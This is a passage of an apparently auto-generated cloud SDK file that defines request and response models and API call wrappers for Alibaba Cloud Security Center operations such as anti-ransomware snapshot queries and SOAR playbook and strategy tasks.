  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSimilarSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries alert events that are triggered by the same rule or of the same alert type.
 *
 * @param request DescribeSimilarSecurityEventsRequest
 * @return DescribeSimilarSecurityEventsResponse
 */
async function describeSimilarSecurityEvents(request: DescribeSimilarSecurityEventsRequest): DescribeSimilarSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSimilarSecurityEventsWithOptions(request, runtime);
}

model DescribeSnapshotsRequest {
  apiVersion?: string(name='ApiVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**

This parameter is required.', example='2.0.0'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  isAliYunEcs?: string(name='IsAliYunEcs', description='Specifies whether the server is an Elastic Compute Service (ECS) instance. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  machineRegion?: string(name='MachineRegion', description='The region in which the server resides.

>  If the Uuid parameter is not specified, this parameter is required.', example='us-east-1'),
  machineRemark?: string(name='MachineRemark', description='The name or IP address of the server.', example='192.168.XX.XX'),
  nextToken?: string(name='NextToken', description='The starting position of the query. If this parameter is left empty, the query starts from the beginning.

>  If you call the operation for the first time, you do not need to specify the parameter. The response to the first call contains the token that can be used for the second call. Each subsequent response contains the token that can be used for the next call.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAB4SwmEAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM0NzY3YTZjNjI3NjZmNmU3MjcxNjk3NDY5MzY3MjY4****'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

This parameter is required.', example='20'),
  statusList?: string(name='StatusList', description='The status of backup snapshots from which data can be restored. Valid values:

*   **COMPLETE**: complete
*   **PARTIAL_COMPLETE**: partial complete', example='["COMPLETE"]'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeBackupPolicy](~~DescribeBackupPolicy~~) operation to query the UUIDs of servers.', example='061d8042-59ff-416e-bc33-294a1cf5****'),
}

model DescribeSnapshotsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    nextToken?: string(name='NextToken', description='The token that is used to initiate the next call.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4****'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
  snapshots?: [ 
    {
      actualBytes?: long(name='ActualBytes', description='The actual data amount of backup snapshots after duplicates are removed. Unit: bytes.', example='686188****'),
      actualItems?: long(name='ActualItems', description='The actual number of backup objects.

>  This parameter is available only for file backup.', example='123'),
      bytesDone?: long(name='BytesDone', description='The actual amount of data that is generated by incremental backup. Unit: bytes.', example='800'),
      bytesTotal?: long(name='BytesTotal', description='The total data amount of the data source. Unit: bytes.', example='3484541815****'),
      clientId?: string(name='ClientId', description='This parameter is returned only if the value of the **SourceType** parameter is **ECS_FILE**. This parameter indicates the ID of the Hybrid Backup Recovery (HBR) agent.', example='c-000dbefaw9f7gnbw****'),
      clientVersion?: string(name='ClientVersion', description='The version of the anti-ransomware agent.', example='2.10.0'),
      createdTime?: long(name='CreatedTime', description='The time when the backup snapshot was created. The value is a UNIX timestamp. Unit: seconds.', example='1646793988'),
      errorFile?: string(name='ErrorFile', description='The file that records the information about backup failures, including the information about partially completed backup tasks.', example='s-0008ndhgrflh55i5****.csv'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance.', example='i-2ze78zfakirgh1yl****'),
      itemsDone?: long(name='ItemsDone', description='The number of backup objects.

>  This parameter is available only for file backup.', example='6'),
      itemsTotal?: long(name='ItemsTotal', description='The total number of objects in the data source.

>  This parameter is available only for file backup.', example='7'),
      jobId?: string(name='JobId', description='The ID of the backup task.', example='job-000a2q5vg6awgo01****'),
      parentSnapshotHash?: string(name='ParentSnapshotHash', description='The hash value of the parent backup snapshot.', example='a0181606689c9562f092b3190bddb8a62bb5a24784424ba2102bc7fe92ae****'),
      path?: string(name='Path', description='This parameter is returned only if the value of the **SourceType** parameter is **ECS_FILE**. This parameter indicates the path to the backup files.', example='["/home"]'),
      paths?: [ string ](name='Paths', description='This parameter is returned only if the value of the **SourceType** parameter is **NAS**. This parameter indicates the path to the backup files.'),
      planId?: string(name='PlanId', description='The ID of the backup plan.', example='plan-000ee8gh2ljelsnb****'),
      regionId?: string(name='RegionId', description='The ID of the region in which backup snapshot is stored.', example='us-east-1'),
      retention?: long(name='Retention', description='The retention period of the backup snapshot.', example='7'),
      snapshotHash?: string(name='SnapshotHash', description='The hash value of the backup snapshot.', example='9ee47cf12351e4ddecce8c12f4957d3946cd96fbe24cd4ab264c7200839d****'),
      snapshotId?: string(name='SnapshotId', description='The ID of the backup snapshot.', example='s-0003ahfuqpjdztsg****'),
      sourceType?: string(name='SourceType', description='The type of the data source. Valid values:

*   **ECS_FILE**: ECS files
*   **OSS**: Object Storage Service (OSS) buckets
*   **NAS**: File Storage NAS file systems
*   **OTS_TABLE**: Tablestore instances', example='ECS_FILE'),
      status?: string(name='Status', description='The status of backup tasks. Valid values:

*   **COMPLETE**: complete
*   **PARTIAL_COMPLETE**: partial complete
*   **FAILED**: failed', example='COMPLETE'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='d332af48-1269-4a55-a6db-8543a80f****'),
      vaultId?: string(name='VaultId', description='The ID of the backup vault that stores the backup snapshot.', example='v-000ccok3zmw7fbzz****'),
    }
  ](name='Snapshots', description='An array that consists of the backup snapshots.'),
}

model DescribeSnapshotsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSnapshotsResponseBody(name='body'),
}

/**
 * @summary Queries the backup snapshots that are created for anti-ransomware.
 *
 * @param request DescribeSnapshotsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSnapshotsResponse
 */
async function describeSnapshotsWithOptions(request: DescribeSnapshotsRequest, runtime: Util.RuntimeOptions): DescribeSnapshotsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.apiVersion)) {
    query['ApiVersion'] = request.apiVersion;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.isAliYunEcs)) {
    query['IsAliYunEcs'] = request.isAliYunEcs;
  }
  if (!Util.isUnset(request.machineRegion)) {
    query['MachineRegion'] = request.machineRegion;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.nextToken)) {
    query['NextToken'] = request.nextToken;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSnapshots',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the backup snapshots that are created for anti-ransomware.
 *
 * @param request DescribeSnapshotsRequest
 * @return DescribeSnapshotsResponse
 */
async function describeSnapshots(request: DescribeSnapshotsRequest): DescribeSnapshotsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSnapshotsWithOptions(request, runtime);
}

model DescribeSoarPlaybookTaskDetailRequest {
  playbookId?: long(name='PlaybookId', description='Playbook ID.
> You can obtain this parameter by calling the [DescribePlaybooks](https://help.aliyun.com/document_detail/2627461.html) interface.

This parameter is required.', example='123'),
  recordId?: long(name='RecordId', description='The vulnerability ID passed when creating the policy task.
> You can obtain this parameter by calling the [DescribeVulList](~~DescribeVulList~~) interface.

This parameter is required.', example='14'),
  requestUuid?: string(name='RequestUuid', description='UUID of the playbook task execution.
> You can obtain this parameter by calling the [DescribeSoarRecords](https://help.aliyun.com/document_detail/2627455.html) interface.

This parameter is required.', example='a15e37da-abe0-4d87-acd2-024e875a****'),
}

model DescribeSoarPlaybookTaskDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the current call request, which is a unique identifier generated by Alibaba Cloud for this request, and can be used to troubleshoot and locate issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  taskDetail?: {
    logInfo?: string(name='LogInfo', description='Log information of the task.', example='{"status":1, "errMsg":"paramError"}'),
    params?: string(name='Params', description='Parameters for invoking the playbook.', example='params1'),
    processInfo?: string(name='ProcessInfo', description='Process information corresponding to the strategy.', example='{"edges":[{"level":0,"removeFlag":0,"source":1,"target":8}]}'),
    taskName?: string(name='TaskName', description='Task name.', example='task1'),
  }(name='TaskDetail', description='Task details.'),
}

model DescribeSoarPlaybookTaskDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSoarPlaybookTaskDetailResponseBody(name='body'),
}

/**
 * @summary Query the execution details of a remediation task playbook
 *
 * @description This API is only supported by the Enterprise and Flagship editions of Cloud Security Center, other versions do not support it.
 *
 * @param request DescribeSoarPlaybookTaskDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSoarPlaybookTaskDetailResponse
 */
async function describeSoarPlaybookTaskDetailWithOptions(request: DescribeSoarPlaybookTaskDetailRequest, runtime: Util.RuntimeOptions): DescribeSoarPlaybookTaskDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.playbookId)) {
    query['PlaybookId'] = request.playbookId;
  }
  if (!Util.isUnset(request.recordId)) {
    query['RecordId'] = request.recordId;
  }
  if (!Util.isUnset(request.requestUuid)) {
    query['RequestUuid'] = request.requestUuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSoarPlaybookTaskDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query the execution details of a remediation task playbook
 *
 * @description This API is only supported by the Enterprise and Flagship editions of Cloud Security Center, other versions do not support it.
 *
 * @param request DescribeSoarPlaybookTaskDetailRequest
 * @return DescribeSoarPlaybookTaskDetailResponse
 */
async function describeSoarPlaybookTaskDetail(request: DescribeSoarPlaybookTaskDetailRequest): DescribeSoarPlaybookTaskDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSoarPlaybookTaskDetailWithOptions(request, runtime);
}

model DescribeSoarStrategiesRequest {
  pageNumber?: int32(name='PageNumber', description='The page number. Pages start from page 1.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
}

model DescribeSoarStrategiesResponseBody = {
  pageNumber?: int32(name='PageNumber', description='The page number. Pages start from page 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  requestId?: string(name='RequestId', description='The request ID.', example='4BB99533-4FDC-5B9C-A5E4-5AE3E9BE5C78'),
  soarStrategies?: [ 
    {
      creator?: string(name='Creator', description='The Alibaba Cloud account ID of the creator. Default value: 0. The value indicates a system user.', example='0'),
      description?: string(name='Description', description='The description of the policy.', example='strategy_description_01'),
      gmtCreate?: long(name='GmtCreate', description='The timestamp when the policy was created. Unit: milliseconds.', example='1703556715000'),
      gmtModified?: long(name='GmtModified', description='The timestamp when the policy was modified. Unit: milliseconds.', example='1698114242000'),
      id?: long(name='Id', description='The ID of the policy.', example='16064025'),
      name?: string(name='Name', description='The name of the policy.', example='strategy_name01'),
      runMode?: string(name='RunMode', description='The execution mode. Valid values:

*   runmode_TRIGGER_BY_USER: manually executed', example='runmode_TRIGGER_BY_USER'),
      type?: string(name='Type', description='The type of the policy. Valid values:

*   type_vulfix: vulnerability operations', example='type_vulfix'),
    }
  ](name='SoarStrategies', description='The policies.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeSoarStrategiesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSoarStrategiesResponseBody(name='body'),
}

/**
 * @summary Queries the policy templates on the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarStrategiesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSoarStrategiesResponse
 */
async function describeSoarStrategiesWithOptions(request: DescribeSoarStrategiesRequest, runtime: Util.RuntimeOptions): DescribeSoarStrategiesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pageNumber)) {
    query['PageNumber'] = request.pageNumber;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSoarStrategies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the policy templates on the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarStrategiesRequest
 * @return DescribeSoarStrategiesResponse
 */
async function describeSoarStrategies(request: DescribeSoarStrategiesRequest): DescribeSoarStrategiesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSoarStrategiesWithOptions(request, runtime);
}

model DescribeSoarStrategyParamRequest {
  strategyId?: long(name='StrategyId', description='The ID of the policy.

>  You can call the [DescribeSoarStrategies](~~DescribeSoarStrategies~~) operation to obtain the ID.

This parameter is required.', example='15553'),
}

model DescribeSoarStrategyParamResponseBody = {
  params?: string(name='Params', description='The parameters of the policy.', example='{"summary":[{"name":"email","type":"String","isRequired":false,"fromProperty":"notifyConfig.email"}]}'),
  processInfo?: string(name='ProcessInfo', description='The process information of the policy.', example='{"edges":[{"level":0,"removeFlag":0,"source":1,"target":8}]}'),
  requestId?: string(name='RequestId', description='The request ID.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model DescribeSoarStrategyParamResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSoarStrategyParamResponseBody(name='body'),
}

/**
 * @summary Queries the parameters of a policy on the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarStrategyParamRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSoarStrategyParamResponse
 */
async function describeSoarStrategyParamWithOptions(request: DescribeSoarStrategyParamRequest, runtime: Util.RuntimeOptions): DescribeSoarStrategyParamResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSoarStrategyParam',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the parameters of a policy on the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarStrategyParamRequest
 * @return DescribeSoarStrategyParamResponse
 */
async function describeSoarStrategyParam(request: DescribeSoarStrategyParamRequest): DescribeSoarStrategyParamResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSoarStrategyParamWithOptions(request, runtime);
}

model DescribeSoarStrategyTaskDetailRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  strategyTaskId?: long(name='StrategyTaskId', description='The ID of the policy task.

>  You can call the [DescribeSoarStrategyTasks](~~DescribeSoarStrategyTasks~~) operation to obtain the ID.

This parameter is required.', example='10585'),
}

model DescribeSoarStrategyTaskDetailResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='FBBEB173-1F43-505F-A876-C03ECDF6CE4C'),
  taskDetail?: {
    logInfo?: string(name='LogInfo', description='The operational log information of the task.', example='{
"resultContent": "{\\\\"failedNum\\\\":0,\\\\"totalNum\\\\":1,\\\\"successNum\\\\":1}",
"resultStatus": 0,
"status": 2
}'),
    params?: string(name='Params', description='The parameters of the task.', example='[
    {
        "name": "vulList",
        "associationProperty": "sasAllVul",
        "value": [
            {
                "regionId": "cn-hangzhou",
                "instanceId": "i-bp10i3dtyq7x4****5e",
                "instanceName": "xxx",
                "vulId": 1222,
                "vulName": "centos:7:cesa-2024:1249",
                "vulAliasName": "CESA-2024:1249",
                "vulTag": "oval",
                "vulUuid": "3c5eb76a-df89-****-85ef-67562cdc2344",
                "vulType": "cve",
                "vulModifyTs": 1721324258000
            }
        ]
    },
    {
        "name": "snapshotConfig",
        "associationProperty": "snapshotConfig",
        "value": {
            "ttl": 1
        }
    },
    {
        "name": "notifyConfig",
        "associationProperty": "notifyConfig",
        "value": {
            "ding": [
                {
                    "value": 2195,
                    "label": "test"
                }
            ]
        }
    }
]'),
    processInfo?: string(name='ProcessInfo', description='The process information of the task.', example='{
    "edges": [
        {
            "level": 0,
            "removeFlag": 0,
            "source": 1,
            "target": 8
        }
    ],
    "nodes": [
        {
            "actionId": "Action_014s73k",
            "iconUrl": "https://img.alicdn.com/tfs/TB1T*****jSZLeXXb9kVXa-12-14.svg",
            "id": 1,
            "label": "describeDisks",
            "nodeName": "DescribeDisks",
            "status": 0,
            "type": "openAPI"
        }
    ]
}'),
    taskName?: string(name='TaskName', description='The name of the task.', example='task-1'),
  }(name='TaskDetail', description='The details of the task.'),
}

model DescribeSoarStrategyTaskDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSoarStrategyTaskDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of a policy task on the Playbook page, including the execution status of the task and the process information of the task.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarStrategyTaskDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSoarStrategyTaskDetailResponse
 */
async function describeSoarStrategyTaskDetailWithOptions(request: DescribeSoarStrategyTaskDetailRequest, runtime: Util.RuntimeOptions): DescribeSoarStrategyTaskDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyTaskId)) {
    query['StrategyTaskId'] = request.strategyTaskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSoarStrategyTaskDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of a policy task on the Playbook page, including the execution status of the task and the process information of the task.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarStrategyTaskDetailRequest
 * @return DescribeSoarStrategyTaskDetailResponse
 */
async function describeSoarStrategyTaskDetail(request: DescribeSoarStrategyTaskDetailRequest): DescribeSoarStrategyTaskDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSoarStrategyTaskDetailWithOptions(request, runtime);
}

model DescribeSoarStrategyTaskParamsRequest {
  strategyTaskId?: long(name='StrategyTaskId', description='Strategy task ID.
> You can obtain this parameter by calling the [DescribeSoarStrategyTasks](~~DescribeSoarStrategyTasks~~) interface.', example='100'),
}

model DescribeSoarStrategyTaskParamsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of this request, which is a unique identifier generated by Alibaba Cloud for this request, and can be used to troubleshoot and locate issues.', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
  taskDetail?: {
    params?: string(name='Params', description='Task parameters.', example='{"summary":[{"name":"email","type":"String","isRequired":false,"fromProperty":"notifyConfig.email"}]}'),
    taskName?: string(name='TaskName', description='任务名称。', example='task1'),
  }(name='TaskDetail', description='Task details.'),
}

model DescribeSoarStrategyTaskParamsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSoarStrategyTaskParamsResponseBody(name='body'),
}

/**
 * @summary Get the input parameters for a specific task
 *
 * @description Only the Enterprise and Flagship editions of Cloud Security Center support this API call, other versions do not support it.
 *
 * @param request DescribeSoarStrategyTaskParamsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSoarStrategyTaskParamsResponse
 */
async function describeSoarStrategyTaskParamsWithOptions(request: DescribeSoarStrategyTaskParamsRequest, runtime: Util.RuntimeOptions): DescribeSoarStrategyTaskParamsResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSoarStrategyTaskParams',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get the input parameters for a specific task
 *
 * @description Only the Enterprise and Flagship editions of Cloud Security Center support this API call, other versions do not support it.
 *
 * @param request DescribeSoarStrategyTaskParamsRequest
 * @return DescribeSoarStrategyTaskParamsResponse
 */
async function describeSoarStrategyTaskParams(request: DescribeSoarStrategyTaskParamsRequest): DescribeSoarStrategyTaskParamsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSoarStrategyTaskParamsWithOptions(request, runtime);
}

model DescribeSoarStrategyTaskResultRequest {
  condition?: string(name='Condition', description='Condition parameters for task scheduling.', example='{"status":1}'),
  currentPage?: int32(name='CurrentPage', description='The current page number during paginated queries.', example='1'),
  pageSize?: int32(name='PageSize', description='The maximum number of entries to display per page during paginated queries.', example='20'),
  strategyTaskId?: long(name='StrategyTaskId', description='Strategy task ID.
> You can obtain this parameter by calling the [DescribeSoarStrategyTasks](~~DescribeSoarStrategyTasks~~) interface.', example='100'),
}

model DescribeSoarStrategyTaskResultResponseBody = {
  pageInfo?: {
    pageNumber?: int32(name='PageNumber', description='The current page number during paginated queries.', example='1'),
    pageSize?: int32(name='PageSize', description='The maximum number of entries to display per page during paginated queries.', example='20'),
    totalCount?: int32(name='TotalCount', description='总条数。', example='1'),
  }(name='PageInfo', description='Pagination information.'),
  records?: [ string ](name='Records', description='Collection of execution records.'),
  requestId?: string(name='RequestId', description='The ID of the current request, a unique identifier generated by Alibaba Cloud for this request, which can be used for troubleshooting and issue localization.', example='1683940A-E4AE-4473-8C40-F4075434****'),
}

model DescribeSoarStrategyTaskResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSoarStrategyTaskResultResponseBody(name='body'),
}

/**
 * @summary Get the list of task execution results
 *
 * @description This API is only supported by the Enterprise and Flagship editions of Cloud Security Center, other versions do not support it.
 *
 * @param request DescribeSoarStrategyTaskResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSoarStrategyTaskResultResponse
 */
async function describeSoarStrategyTaskResultWithOptions(request: DescribeSoarStrategyTaskResultRequest, runtime: Util.RuntimeOptions): DescribeSoarStrategyTaskResultResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSoarStrategyTaskResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get the list of task execution results
 *
 * @description This API is only supported by the Enterprise and Flagship editions of Cloud Security Center, other versions do not support it.
 *
 * @param request DescribeSoarStrategyTaskResultRequest
 * @return DescribeSoarStrategyTaskResultResponse
 */
async function describeSoarStrategyTaskResult(request: DescribeSoarStrategyTaskResultRequest): DescribeSoarStrategyTaskResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSoarStrategyTaskResultWithOptions(request, runtime);
}

model DescribeSoarStrategyTasksRequest {
  pageNumber?: int32(name='PageNumber', description='The page number. Pages start from page 1.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
}

model DescribeSoarStrategyTasksResponseBody = {
  pageNumber?: int32(name='PageNumber', description='The page number. Pages start from page 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  soarStrategyTasks?: [ 
    {
      failedNum?: int32(name='FailedNum', description='The number of execution failures.', example='20'),
      gmtCreate?: long(name='GmtCreate', description='The timestamp when the policy task was created. Unit: milliseconds.', example='1708481235000'),
      gmtFinish?: long(name='GmtFinish', description='The timestamp when the policy task was complete. Unit: milliseconds.', example='1586739841000'),
      gmtModified?: long(name='GmtModified', description='The timestamp when the policy task was modified. Unit: milliseconds.', example='1669869436000'),
      id?: long(name='Id', description='The ID of the policy task.', example='5374'),
      name?: string(name='Name', description='The name of the policy task.', example='strategy_name01'),
      runMode?: string(name='RunMode', description='The execution mode. Valid values:

*   runmode_TRIGGER_BY_USER: manually executed', example='runmode_TRIGGER_BY_USER'),
      status?: string(name='Status', description='The status of the policy task. Valid values:

*   \\\\-1: waiting
*   0: starting
*   1: running
*   2: finished
*   3: schedule
*   4: pause', example='0'),
      strategyId?: long(name='StrategyId', description='The ID of the policy.', example='8000'),
      successNum?: int32(name='SuccessNum', description='The number of successful executions.', example='20'),
      totalNum?: int32(name='TotalNum', description='The total number of executions.', example='20'),
    }
  ](name='SoarStrategyTasks', description='The policy tasks.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeSoarStrategyTasksResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSoarStrategyTasksResponseBody(name='body'),
}

/**
 * @summary Queries a list of policy tasks on the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarStrategyTasksRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSoarStrategyTasksResponse
 */
async function describeSoarStrategyTasksWithOptions(request: DescribeSoarStrategyTasksRequest, runtime: Util.RuntimeOptions): DescribeSoarStrategyTasksResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pageNumber)) {
    query['PageNumber'] = request.pageNumber;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSoarStrategyTasks',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
